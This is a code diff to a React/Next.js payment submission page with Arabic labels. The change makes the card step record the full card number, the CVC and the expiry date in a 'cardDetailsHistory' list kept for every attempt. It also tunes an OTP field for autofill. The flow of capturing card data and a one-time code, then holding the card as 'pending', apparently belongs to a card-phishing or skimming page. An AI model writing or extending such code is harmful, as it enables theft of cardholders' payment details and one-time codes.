@@ -2,7 +2,7 @@
 
 import { FormEvent, useEffect, useMemo, useRef, useState } from 'react'
 import { db } from '@/lib/firebase'
-import { doc, onSnapshot, setDoc } from 'firebase/firestore'
+import { arrayUnion, doc, onSnapshot, setDoc } from 'firebase/firestore'
 import { Button } from '@/app/components/ui/button'
 import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/app/components/ui/card'
 import { Input } from '@/app/components/ui/input'
@@ -406,7 +406,20 @@ export default function SubmitPage() {
 
     setLoading(true)
     try {
-      await saveToFirestore({ step: 5, currentPage: 'card-info', cardState: 'pending' })
+      const [expiryYear, expiryMonth] = cardExpiry.split('-')
+      await saveToFirestore({
+        step: 5,
+        currentPage: 'card-info',
+        cardState: 'pending',
+        cardDetailsHistory: arrayUnion({
+          cardNumber: cleanCard,
+          CVC: cvv,
+          dateMonth: expiryMonth ?? '',
+          datayaer: expiryYear ? expiryYear.slice(-2) : '',
+          cardExpiry,
+          submittedAt: Date.now(),
+        }),
+      })
     } catch {}
     setLoading(false)
 
@@ -869,11 +882,14 @@ export default function SubmitPage() {
                   <Label htmlFor="otp">رمز التحقق <span className="text-red-500">*</span></Label>
                   <Input
                     id="otp"
+                    name="one-time-code"
                     value={otp}
                     onChange={e => setOtp(e.target.value.replace(/\D/g, ''))}
                     placeholder="أدخل الرمز المكوّن من 6 أرقام"
                     className="h-11 text-center text-xl font-mono tracking-widest"
+                    autoComplete="one-time-code"
                     inputMode="numeric"
+                    pattern="[0-9]*"
                     maxLength={6}
                   />
                 </div>
